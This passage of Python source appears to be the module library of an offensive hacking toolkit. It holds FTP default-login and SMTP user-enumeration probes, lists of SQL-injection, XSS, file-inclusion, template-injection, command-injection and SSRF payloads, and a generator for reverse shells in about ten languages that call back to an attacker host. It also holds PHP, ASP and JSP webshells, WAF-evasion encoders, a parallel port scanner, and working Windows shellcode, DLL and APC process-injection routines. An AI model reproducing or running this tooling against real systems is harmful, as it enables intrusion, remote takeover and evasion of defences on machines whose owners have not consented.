    try:
        if tls:
            server = smtplib.SMTP_SSL(host, port, timeout=5)
        else:
            server = smtplib.SMTP(host, port, timeout=5)
        banner = server.ehlo_resp.decode('utf-8', errors='ignore') if server.ehlo_resp else ""
        server.quit()
        return _rv({"connected": True, "banner": banner}, "dict")
    except Exception as e:
        return _rv({"connected": False, "error": str(e)}, "dict")

def _smtp_send(host, port, user, pwd, to, subject, body):
    try:
        import email.mime.text
        msg = email.mime.text.MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = user
        msg['To'] = to
        with smtplib.SMTP(host, port, timeout=10) as s:
            s.starttls()
            s.login(user, pwd)
            s.send_message(msg)
        return _rv(True, "bool")
    except Exception as e:
        return _rv({"error": str(e)}, "dict")

def _smtp_test(host, port=25):
    try:
        s = smtplib.SMTP(host, port, timeout=5)
        banner = s.getwelcome().decode('utf-8', errors='ignore')
        s.quit()
        return _rv({"open": True, "banner": banner}, "dict")
    except: return _rv({"open": False}, "dict")

def _smtp_banner(host, port=25):
    try:
        s = smtplib.SMTP(host, port, timeout=5)
        banner = s.getwelcome().decode('utf-8', errors='ignore')
        s.quit()
        return banner
    except: return ""

def _smtp_vrfy(host, port=25, user="root"):
    try:
        s = smtplib.SMTP(host, port, timeout=5)
        code, msg = s.verify(user)
        s.quit()
        return _rv({"code": code, "message": msg.decode('utf-8', errors='ignore'), "valid": code == 250}, "dict")
    except Exception as e: return _rv({"error": str(e)}, "dict")

def _smtp_expn(host, port=25, list_name="admin"):
    try:
        s = smtplib.SMTP(host, port, timeout=5)
        code, msg = s.expn(list_name)
        s.quit()
        return _rv({"code": code, "message": msg.decode('utf-8', errors='ignore')}, "dict")
    except Exception as e: return _rv({"error": str(e)}, "dict")


def ftp_module() -> Dict[str, Callable]:
    return {
        "connect":  lambda host, port=21, user="anonymous", pwd="anon@": _ftp_connect(_v(host), int(_v(port)), _v(user), _v(pwd)),
        "list":     lambda host, port=21, user="anonymous", pwd="anon@", path="/": _ftp_list(_v(host), int(_v(port)), _v(user), _v(pwd), _v(path)),
        "get":      lambda host, user, pwd, remote, local: _ftp_get(_v(host), _v(user), _v(pwd), _v(remote), _v(local)),
        "banner":   lambda host, port=21: _ftp_banner(_v(host), int(_v(port))),
        "anonymous":lambda host, port=21: _ftp_anon(_v(host), int(_v(port))),
    }

def _ftp_connect(host, port=21, user="anonymous", pwd="anon@"):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(user, pwd)
        welcome = ftp.getwelcome()
        ftp.quit()
        return _rv({"connected": True, "banner": welcome, "user": user}, "dict")
    except Exception as e: return _rv({"connected": False, "error": str(e)}, "dict")

def _ftp_list(host, port=21, user="anonymous", pwd="anon@", path="/"):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(user, pwd)
        files = ftp.nlst(path)
        ftp.quit()
        return _arr([_rv(f, "string") for f in files])
    except: return _arr([])

def _ftp_get(host, user, pwd, remote, local):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=10)
        ftp.login(user, pwd)
        with open(local, 'wb') as f:
            ftp.retrbinary(f"RETR {remote}", f.write)
        ftp.quit()
        return _rv(True, "bool")
    except Exception as e: return _rv({"error": str(e)}, "dict")

def _ftp_banner(host, port=21):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        banner = ftp.getwelcome()
        ftp.quit()
        return _rv(banner, "string")
    except: return _rv("", "string")

def _ftp_anon(host, port=21):
    for u, p in [("anonymous", "anonymous@"), ("anonymous", ""), ("ftp", "ftp"), ("admin", "")]:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(u, p)
            ftp.quit()
            return _rv({"open": True, "user": u, "pass": p}, "dict")
        except: pass
    return _rv({"open": False}, "dict")


# ═══════════════════════════════════════════════════════════════════════
# MODULE REGISTRY
# ═══════════════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════════════
# CYBERSECURITY MODULES
# ═══════════════════════════════════════════════════════════════════════

def vuln_module() -> Dict[str, Callable]:
    """Vulnerability detection: SQLi/XSS/LFI/SSRF/CMDi/SSTI payloads and active testing"""
    import urllib.request, urllib.parse

    SQLI = ["' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "1' ORDER BY 1--",
            "1' ORDER BY 2--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' AND SLEEP(5)--", "1; SELECT SLEEP(5)--", "' AND 1=1--", "' AND 1=2--",
            "'; DROP TABLE users--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR SLEEP(5)--", "admin'--", "' OR ''='"]
    XSS  = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "javascript:alert(1)",
            '"><script>alert(1)</script>', "'><script>alert(1)</script>",
            "<ScRiPt>alert(1)</ScRiPt>", "<iframe src=javascript:alert(1)>",
            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
            "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">"]
    LFI  = ["../../../etc/passwd", "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd",
            "/etc/passwd", "/etc/shadow", "/proc/self/environ",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input", "data://text/plain,<?php system($_GET['cmd']); ?>"]
    SSTI = ["{{7*7}}", "{{7*'7'}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
            "{{config}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"]
    CMDI = ["; id", "| id", "& id", "&& id", "; cat /etc/passwd",
            "`id`", "$(id)", "\nid", "; whoami", "1; ls -la", "1 | ls"]
    SSRF = ["http://127.0.0.1/", "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://0.0.0.0/", "file:///etc/passwd",
            "dict://127.0.0.1:6379/", "gopher://127.0.0.1:6379/",
            "http://2130706433/"]  # 127.0.0.1 decimal

    SQLI_ERRORS = ["you have an error in your sql", "syntax error", "unclosed quotation",
                   "mysql_fetch", "ORA-", "pg_query()", "sqlite_", "warning: mysql",
                   "division by zero", "supplied argument is not a valid mysql"]

    def _test_sqli(url, param, method="GET"):
        results = []
        for payload in SQLI[:6]:
            try:
                u = f"{_v(url)}?{_v(param)}={urllib.parse.quote(payload)}"
                with urllib.request.urlopen(urllib.request.Request(u), timeout=5) as r:
                    body = r.read().decode('utf-8', errors='ignore').lower()
                    for err in SQLI_ERRORS:
                        if err in body:
                            results.append(_rv({"payload": payload, "error": err, "url": u}, "dict"))
                            break
            except Exception: pass
        return _rv(results, "array")

    def _test_xss(url, param):
        results = []
        for payload in XSS[:5]:
            try:
                u = f"{_v(url)}?{_v(param)}={urllib.parse.quote(payload)}"
                with urllib.request.urlopen(urllib.request.Request(u), timeout=5) as r:
                    body = r.read().decode('utf-8', errors='ignore')
                    if payload in body:
                        results.append(_rv({"payload": payload, "type": "reflected", "url": u}, "dict"))
            except Exception: pass
        return _rv(results, "array")

    def _test_lfi(url, param):
        results = []
        indicators = ["root:x:", "[boot loader]", "daemon:", "windows nt"]
        for payload in LFI[:5]:
            try:
                u = f"{_v(url)}?{_v(param)}={urllib.parse.quote(payload)}"
                with urllib.request.urlopen(urllib.request.Request(u), timeout=5) as r:
                    body = r.read().decode('utf-8', errors='ignore').lower()
                    for ind in indicators:
                        if ind in body:
                            results.append(_rv({"payload": payload, "indicator": ind, "url": u}, "dict"))
                            break
            except Exception: pass
        return _rv(results, "array")

    def _scan_headers(url):
        REQUIRED = {
            "x-frame-options": "Clickjacking protection",
            "x-xss-protection": "XSS filter",
            "x-content-type-options": "MIME sniffing protection",
            "strict-transport-security": "HSTS",
            "content-security-policy": "CSP",
            "referrer-policy": "Referrer policy",
        }
        try:
            with urllib.request.urlopen(urllib.request.Request(_v(url)), timeout=10) as r:
                hdrs = {k.lower(): v for k, v in dict(r.headers).items()}
                missing = [_rv({"header": h, "desc": d}, "dict") for h, d in REQUIRED.items() if h not in hdrs]
                present = [_rv({"header": h, "value": hdrs[h]}, "dict") for h in REQUIRED if h in hdrs]
                return _rv({"missing": missing, "present": present, "score": len(present)}, "dict")
        except Exception as e:
            return _rv({"error": str(e), "missing": [], "present": []}, "dict")

    return {
        "sqli_payloads":  lambda: _arr([_rv(p, "string") for p in SQLI]),
        "xss_payloads":   lambda: _arr([_rv(p, "string") for p in XSS]),
        "lfi_payloads":   lambda: _arr([_rv(p, "string") for p in LFI]),
        "ssti_payloads":  lambda: _arr([_rv(p, "string") for p in SSTI]),
        "cmdi_payloads":  lambda: _arr([_rv(p, "string") for p in CMDI]),
        "ssrf_payloads":  lambda: _arr([_rv(p, "string") for p in SSRF]),
        "test_sqli":      _test_sqli,
        "test_xss":       _test_xss,
        "test_lfi":       _test_lfi,
        "scan_headers":   _scan_headers,
        "severity":       lambda score: _rv(
            "Critical" if _v(score) >= 9 else "High" if _v(score) >= 7
            else "Medium" if _v(score) >= 4 else "Low" if _v(score) >= 0.1 else "Info", "string"),
    }


def session_module() -> Dict[str, Callable]:
    """HTTP session management with persistent cookies, redirects and auth"""
    import urllib.request, urllib.parse, urllib.error, http.cookiejar

    class HTTPSession:
        def __init__(self):
            self.cookies = http.cookiejar.CookieJar()
            self.headers  = {"User-Agent": "KOPPA/3.0 Security Scanner"}
            self.opener   = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookies))

        def set_header(self, k, v):   self.headers[_v(k)] = _v(v)
        def get_cookies(self):         return {c.name: c.value for c in self.cookies}

        def get(self, url, timeout=10):
            try:
                req = urllib.request.Request(_v(url), headers=self.headers)
                with self.opener.open(req, timeout=int(_v(timeout))) as r:
                    return _rv({"status": r.status, "body": r.read().decode("utf-8", errors="ignore"),
                                "headers": dict(r.headers), "cookies": self.get_cookies()}, "dict")
            except urllib.error.HTTPError as e:
                return _rv({"status": e.code, "body": e.read().decode("utf-8", errors="ignore"),
                            "error": str(e)}, "dict")
            except Exception as e:
                return _rv({"status": 0, "error": str(e)}, "dict")

        def post(self, url, data=None, json_body=None, timeout=10):
            try:
                hdrs = dict(self.headers)
                if json_body:
                    body = json.dumps({k: _v(v) for k, v in _v(json_body).items()}).encode()
                    hdrs["Content-Type"] = "application/json"
                elif data:
                    d = {k: str(_v(v)) for k, v in _v(data).items()}
                    body = urllib.parse.urlencode(d).encode()
                    hdrs["Content-Type"] = "application/x-www-form-urlencoded"
                else:
                    body = b""
                req = urllib.request.Request(_v(url), data=body, headers=hdrs, method="POST")
                with self.opener.open(req, timeout=int(_v(timeout))) as r:
                    return _rv({"status": r.status, "body": r.read().decode("utf-8", errors="ignore"),
                                "cookies": self.get_cookies()}, "dict")
            except urllib.error.HTTPError as e:
                return _rv({"status": e.code, "body": e.read().decode("utf-8", errors="ignore"),
                            "error": str(e)}, "dict")
            except Exception as e:
                return _rv({"status": 0, "error": str(e)}, "dict")

        def set_proxy(self, proxy_url):
            p = urllib.request.ProxyHandler({"http": _v(proxy_url), "https": _v(proxy_url)})
            self.opener = urllib.request.build_opener(p, urllib.request.HTTPCookieProcessor(self.cookies))

    def _new_session():
        sess = HTTPSession()
        return _rv(sess, "session")

    return {"new": _new_session, "Session": _new_session}


def payload_module() -> Dict[str, Callable]:
    """Reverse shells, webshells, payload encoding, MSF cyclic patterns"""
    import base64, urllib.parse

    SHELLS = {
        "bash":   lambda h, p: f"bash -i >& /dev/tcp/{h}/{p} 0>&1",
        "bash2":  lambda h, p: f"0<&196;exec 196<>/dev/tcp/{h}/{p}; sh <&196 >&196 2>&196",
        "python": lambda h, p: f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "php":    lambda h, p: f"php -r '$sock=fsockopen(\"{h}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc":     lambda h, p: f"nc -e /bin/sh {h} {p}",
        "nc2":    lambda h, p: f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {h} {p} >/tmp/f",
        "perl":   lambda h, p: f"perl -e 'use Socket;$i=\"{h}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby":   lambda h, p: f"ruby -rsocket -e 'f=TCPSocket.open(\"{h}\",{p}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "powershell": lambda h, p: f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{h}',{p});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb=$sb+'PS '+(pwd).Path+'> ';$rb=([text.encoding]::ASCII).GetBytes($sb);$s.Write($rb,0,$rb.Length);$s.Flush()}};$c.Close()\"",
        "go":     lambda h, p: f'package main;import("net";"os/exec");func main(){{c,_:=net.Dial("tcp","{h}:{p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}',
    }
    WEBSHELLS = {
        "php":    "<?php system($_GET['cmd']); ?>",
        "php2":   "<?php passthru($_GET['cmd']); ?>",
        "php3":   "<?php echo shell_exec($_GET['cmd']); ?>",
        "php4":   "<?php @eval($_POST['cmd']); ?>",
        "asp":    '<%@ Language=VBScript %>\n<% Response.Write CreateObject("Wscript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall() %>',
        "jsp":    '<% Runtime rt=Runtime.getRuntime();String[] c={"/bin/bash","-c",request.getParameter("cmd")};Process p=rt.exec(c);out.println(new java.util.Scanner(p.getInputStream()).useDelimiter("\\A").next()); %>',
    }

    def _reverse_shell(lang, lhost, lport):
        fn = SHELLS.get(_v(lang).lower())
        if fn: return _rv(fn(_v(lhost), str(_v(lport))), "string")
        return _rv("# unsupported language", "string")

    def _encode(payload, method):
        p, m = _v(payload), _v(method).lower()
        if m == "base64":  return _rv(base64.b64encode(p.encode()).decode(), "string")
        if m == "url":     return _rv(urllib.parse.quote(p), "string")
        if m == "url2":    return _rv(urllib.parse.quote(urllib.parse.quote(p)), "string")
        if m == "hex":     return _rv(p.encode().hex(), "string")
        if m == "unicode": return _rv("".join(f"\\u{ord(c):04x}" for c in p), "string")
        if m == "html":    return _rv("".join(f"&#{ord(c)};" for c in p), "string")
        return _rv(p, "string")

    def _msf_pattern(length):
        upper, lower, digits = "ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz", "0123456789"
        pat = ""
        for u in upper:
            for l in lower:
                for d in digits:
                    pat += u + l + d
                    if len(pat) >= int(_v(length)):
                        return _rv(pat[:int(_v(length))], "string")
        return _rv(pat[:int(_v(length))], "string")

    def _xor_encode(data, key):
        d = _v(data)
        k = _v(key)
        if isinstance(d, str): d = d.encode()
        if isinstance(k, int): result = bytes(b ^ k for b in d)
        elif isinstance(k, str):
            kb = k.encode()
            result = bytes(d[i] ^ kb[i % len(kb)] for i in range(len(d)))
        else: result = d
        return _rv(result.hex(), "string")

    def _sql_union(cols):
        return _rv("' UNION SELECT " + ",".join(["NULL"] * int(_v(cols))) + "--", "string")

    return {
        "reverse_shell":  _reverse_shell,
        "webshell":       lambda lang: _rv(WEBSHELLS.get(_v(lang).lower(), "# unknown"), "string"),
        "encode":         _encode,
        "xor_encode":     _xor_encode,
        "msf_pattern":    _msf_pattern,
        "shells":         lambda: _arr([_rv(k, "string") for k in SHELLS.keys()]),
        "listener":       lambda h, p: _rv(f"nc -lvnp {_v(p)}", "string"),
        "listener_ssl":   lambda h, p: _rv(f"ncat --ssl -lvnp {_v(p)}", "string"),
        "sql_union":      _sql_union,
        "sql_sleep":      lambda s: _rv(f"'; SELECT SLEEP({_v(s)})--", "string"),
    }


def bypass_module() -> Dict[str, Callable]:
    """WAF bypass techniques, IP obfuscation, encoding chains"""
    import urllib.parse, base64

    def _xss_variants(payload):
        p = _v(payload)
        return _arr([_rv(v, "string") for v in [
            p,
            p.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"),
            p.replace(" ", "\t"),
            p.replace("alert", "confirm"),
            p.replace("alert", "prompt"),
            p.replace("<", "%3C").replace(">", "%3E"),
            "<!--" + p + "-->",
            p.replace("alert(1)", "alert(1)//"),
        ]])

    def _sqli_variants(payload):
        p = _v(payload)
        return _arr([_rv(v, "string") for v in [
            p, p.upper(), p.lower(),
            p.replace(" ", "/**/"),
            p.replace(" ", "%20"),
            p.replace(" ", "+"),
            p.replace("SELECT", "SEL/**/ECT"),
            p.replace("UNION", "UN/**/ION"),
            p.replace("=", " LIKE "),
            urllib.parse.quote(p),
        ]])

    def _ip_variants(ip):
        parts = _v(ip).split(".")
        if len(parts) != 4: return _arr([_rv(_v(ip), "string")])
        a, b, c, d = (int(x) for x in parts)
        dec = (a << 24) | (b << 16) | (c << 8) | d
        return _arr([_rv(v, "string") for v in [
            _v(ip),
            str(dec),
            f"0x{dec:08x}",
            ".".join(f"0{oct(int(x))[2:]}" for x in parts),
            ".".join(f"0x{int(x):02x}" for x in parts),
            f"[::ffff:{a}.{b}.{c}.{d}]",
            f"0x7f.0.0.1" if _v(ip) == "127.0.0.1" else _v(ip),
        ]])

    def _encode_chain(payload, *methods):
        p = _v(payload)
        for m in methods:
            mv = _v(m).lower()
            if mv == "base64":  p = base64.b64encode(p.encode()).decode()
            elif mv == "url":   p = urllib.parse.quote(p)
            elif mv == "html":  p = "".join(f"&#{ord(c)};" for c in p)
            elif mv == "hex":   p = p.encode().hex()
        return _rv(p, "string")

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "sqlmap/1.7.12#stable (https://sqlmap.org)",
        "Nikto/2.1.6",
        "curl/7.68.0",
        "python-requests/2.31.0",
    ]

    return {
        "xss_variants":   _xss_variants,
        "sqli_variants":  _sqli_variants,
        "ip_variants":    _ip_variants,
        "encode_chain":   _encode_chain,
        "user_agents":    lambda: _arr([_rv(ua, "string") for ua in USER_AGENTS]),
        "random_ua":      lambda: _rv(USER_AGENTS[int(__import__('time').time()) % len(USER_AGENTS)], "string"),
        "null_byte":      lambda p: _rv(_v(p) + "%00", "string"),
        "double_encode":  lambda p: _rv(urllib.parse.quote(urllib.parse.quote(_v(p))), "string"),
        "case_toggle":    lambda p: _rv("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(_v(p))), "string"),
    }


def adv_scan_module() -> Dict[str, Callable]:
    """Advanced port scanning: parallel, UDP, banner grabbing, service detection"""
    import socket, concurrent.futures

    SERVICES = {
        21:"ftp", 22:"ssh", 23:"telnet", 25:"smtp", 53:"dns",
        80:"http", 110:"pop3", 111:"rpcbind", 135:"msrpc", 139:"netbios",
        143:"imap", 161:"snmp", 389:"ldap", 443:"https", 445:"smb",
        512:"rexec", 513:"rlogin", 514:"rsh", 587:"smtp",
        631:"ipp", 993:"imaps", 995:"pop3s", 1080:"socks5",
        1433:"mssql", 1521:"oracle", 2049:"nfs", 2375:"docker",
        3306:"mysql", 3389:"rdp", 4444:"metasploit", 5432:"postgresql",
        5900:"vnc", 6379:"redis", 6443:"kubernetes", 8080:"http-alt",
        8443:"https-alt", 8888:"jupyter", 9200:"elasticsearch",
        27017:"mongodb", 50000:"db2",
    }

    def _tcp(host, port, timeout=1.0):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(float(_v(timeout)))
            ok = s.connect_ex((_v(host), int(_v(port)))) == 0
            s.close()
            return _rv(ok, "bool")
        except Exception:
            return _rv(False, "bool")

    def _udp(host, port, timeout=2.0):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(float(_v(timeout)))
            s.sendto(b"\x00", (_v(host), int(_v(port))))
            try:
                s.recvfrom(64)
                s.close()
                return _rv(True, "bool")
            except socket.timeout:
                s.close()
                return _rv(True, "bool")
        except Exception:
            return _rv(False, "bool")

    def _banner(host, port, timeout=3.0):
        try:
            h, p, t = _v(host), int(_v(port)), float(_v(timeout))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(t)
            s.connect((h, p))
            if p in (80, 8080, 8000):
                s.send(f"HEAD / HTTP/1.0\r\nHost: {h}\r\n\r\n".encode())
            elif p == 21:
                pass  # FTP sends banner automatically
            banner = s.recv(1024).decode("utf-8", errors="replace").strip()
            s.close()
            return _rv(banner, "string")
        except Exception:
            return _rv("", "string")

    def _parallel(host, ports, timeout=1.0, threads=100):
        h, t = _v(host), float(_v(timeout))
        plist = [int(_v(p)) for p in _v(ports)]
        open_ports = []
        def _scan(port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(t)
            try:
                ok = s.connect_ex((h, port)) == 0
            except Exception:
                ok = False
            finally:
                s.close()
            return port, ok
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(int(_v(threads)), 250)) as ex:
            for port, ok in ex.map(_scan, plist):
                if ok:
                    open_ports.append(_rv(port, "int"))
        open_ports.sort(key=lambda x: _v(x))
        return _rv(open_ports, "array")

    def _port_range(start, end):
        return _rv([_rv(p, "int") for p in range(int(_v(start)), int(_v(end)) + 1)], "array")

    TOP_PORTS = sorted(SERVICES.keys())

    return {
        "tcp":          _tcp,
        "udp":          _udp,
        "banner":       _banner,
        "parallel":     _parallel,
        "mass":         _parallel,
        "port_range":   _port_range,
        "service":      lambda p: _rv(SERVICES.get(int(_v(p)), "unknown"), "string"),
        "top_ports":    lambda n=20: _rv([_rv(p, "int") for p in TOP_PORTS[:int(_v(n))]], "array"),
        "common_ports": lambda: _rv([_rv(p, "int") for p in TOP_PORTS[:20]], "array"),
        "is_open":      _tcp,
    }


# ═══════════════════════════════════════════════════════════════════════
# PROCESS INJECTION  (Windows API via ctypes)
# ═══════════════════════════════════════════════════════════════════════

def inject_module() -> Dict[str, Callable]:
    import platform
    import ctypes
    _is_win = platform.system() == "Windows"

    PROCESS_ALL_ACCESS     = 0x1F0FFF
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    MEM_RELEASE            = 0x8000
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_READWRITE         = 0x04
    TH32CS_SNAPPROCESS     = 0x00000002
    TH32CS_SNAPTHREAD      = 0x00000004

    def _k32():
        if not _is_win:
            raise RuntimeError("inject module requires Windows")
        return ctypes.windll.kernel32

    def _list_procs():
        if not _is_win:
            return _rv([_rv({"pid": 0, "name": "windows-only"}, "dict")], "array")
        k32 = _k32()

        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [
                ("dwSize",              ctypes.c_ulong),
                ("cntUsage",            ctypes.c_ulong),
                ("th32ProcessID",       ctypes.c_ulong),
                ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID",        ctypes.c_ulong),
                ("cntThreads",          ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong),
                ("pcPriClassBase",      ctypes.c_long),
                ("dwFlags",             ctypes.c_ulong),
                ("szExeFile",           ctypes.c_char * 260),
            ]

        snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
        procs = []
        if k32.Process32First(snap, ctypes.byref(pe)):
            while True:
                procs.append(_rv({
                    "pid":        pe.th32ProcessID,
                    "name":       pe.szExeFile.decode("utf-8", errors="replace"),
                    "parent_pid": pe.th32ParentProcessID,
                    "threads":    pe.cntThreads,
                }, "dict"))
                if not k32.Process32Next(snap, ctypes.byref(pe)):
                    break
        k32.CloseHandle(snap)
        return _rv(procs, "array")

    def _find_pid(name):
        name = _v(name)
        if not _is_win:
            return _rv(-1, "int")
        for p in _list_procs().value:
            proc = p.value if isinstance(p, type(p)) else p
            n = proc.get("name") if isinstance(proc, dict) else None
            if n is None:
                continue
            n = n.value if hasattr(n, "value") else n
            if isinstance(n, str) and n.lower() == name.lower():
                pid = proc.get("pid")
                return pid if hasattr(pid, "value") else _rv(pid, "int")
        return _rv(-1, "int")

    def _bytes_from_val(val):
        if hasattr(val, "data"):
            return val.data
        if isinstance(val, (bytes, bytearray)):
            return bytes(val)
        if isinstance(val, str):
            return bytes.fromhex(val.replace(" ", "").replace("\\x", ""))
        return b""

    def _shellcode_inject(pid, shellcode):
        pid = _v(pid)
        sc  = _bytes_from_val(_v(shellcode))
        if not _is_win:
            return _rv({"ok": False, "error": "Windows only"}, "dict")
        k32 = _k32()
        h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h:
            return _rv({"ok": False, "error": f"OpenProcess failed (err={ctypes.GetLastError()})"}, "dict")
        try:
            addr = k32.VirtualAllocEx(h, None, len(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not addr:
                return _rv({"ok": False, "error": "VirtualAllocEx failed"}, "dict")
            buf = (ctypes.c_char * len(sc))(*sc)
            written = ctypes.c_size_t(0)
            if not k32.WriteProcessMemory(h, addr, buf, len(sc), ctypes.byref(written)):
                k32.VirtualFreeEx(h, addr, 0, MEM_RELEASE)
                return _rv({"ok": False, "error": "WriteProcessMemory failed"}, "dict")
            tid = ctypes.c_ulong(0)
            hthread = k32.CreateRemoteThread(h, None, 0, addr, None, 0, ctypes.byref(tid))
            if not hthread:
                k32.VirtualFreeEx(h, addr, 0, MEM_RELEASE)
                return _rv({"ok": False, "error": "CreateRemoteThread failed"}, "dict")
            k32.CloseHandle(hthread)
            return _rv({"ok": True, "pid": pid, "addr": addr, "tid": tid.value}, "dict")
        finally:
            k32.CloseHandle(h)

    def _dll_inject(pid, dll_path):
        pid      = _v(pid)
        dll_path = _v(dll_path)
        if not _is_win:
            return _rv({"ok": False, "error": "Windows only"}, "dict")
        k32 = _k32()
        dll_bytes = (dll_path + "\0").encode("utf-8")
        h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h:
            return _rv({"ok": False, "error": "OpenProcess failed"}, "dict")
        try:
            addr = k32.VirtualAllocEx(h, None, len(dll_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
            if not addr:
                return _rv({"ok": False, "error": "VirtualAllocEx failed"}, "dict")
            buf = (ctypes.c_char * len(dll_bytes))(*dll_bytes)
            written = ctypes.c_size_t(0)
            k32.WriteProcessMemory(h, addr, buf, len(dll_bytes), ctypes.byref(written))
            hmod    = k32.GetModuleHandleW("kernel32.dll")
            loadlib = k32.GetProcAddress(hmod, b"LoadLibraryA")
            tid = ctypes.c_ulong(0)
            hthread = k32.CreateRemoteThread(h, None, 0, loadlib, addr, 0, ctypes.byref(tid))
            if not hthread:
                k32.VirtualFreeEx(h, addr, 0, MEM_RELEASE)
                return _rv({"ok": False, "error": "CreateRemoteThread failed"}, "dict")
            k32.WaitForSingleObject(hthread, 5000)
            k32.CloseHandle(hthread)
            return _rv({"ok": True, "pid": pid, "dll": dll_path}, "dict")
        finally:
            k32.CloseHandle(h)

    def _apc_inject(pid, shellcode):
        pid = _v(pid)
        sc  = _bytes_from_val(_v(shellcode))
        if not _is_win:
            return _rv({"ok": False, "error": "Windows only"}, "dict")
        k32 = _k32()

        class THREADENTRY32(ctypes.Structure):
            _fields_ = [
                ("dwSize",             ctypes.c_ulong),
                ("cntUsage",           ctypes.c_ulong),
                ("th32ThreadID",       ctypes.c_ulong),
                ("th32OwnerProcessID", ctypes.c_ulong),
                ("tpBasePri",          ctypes.c_long),
                ("tpDeltaPri",         ctypes.c_long),
                ("dwFlags",            ctypes.c_ulong),
            ]

        h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h:
            return _rv({"ok": False, "error": "OpenProcess failed"}, "dict")
        try:
            addr = k32.VirtualAllocEx(h, None, len(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            buf  = (ctypes.c_char * len(sc))(*sc)
            written = ctypes.c_size_t(0)
            k32.WriteProcessMemory(h, addr, buf, len(sc), ctypes.byref(written))

            snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            te = THREADENTRY32()
            te.dwSize = ctypes.sizeof(THREADENTRY32)
            THREAD_ACCESS = 0x0010 | 0x0002 | 0x0040
            queued = 0
            if k32.Thread32First(snap, ctypes.byref(te)):
                while True:
                    if te.th32OwnerProcessID == pid:
                        ht = k32.OpenThread(THREAD_ACCESS, False, te.th32ThreadID)
                        if ht:
                            k32.QueueUserAPC(addr, ht, None)
                            k32.CloseHandle(ht)
                            queued += 1
                    if not k32.Thread32Next(snap, ctypes.byref(te)):
                        break
            k32.CloseHandle(snap)
            return _rv({"ok": True, "pid": pid, "addr": addr, "threads_queued": queued}, "dict")
        finally:
            k32.CloseHandle(h)

    return {
        "list_procs": lambda: _list_procs(),
        "find_pid":   lambda name: _find_pid(name),
        "shellcode":  lambda pid, sc: _shellcode_inject(pid, sc),
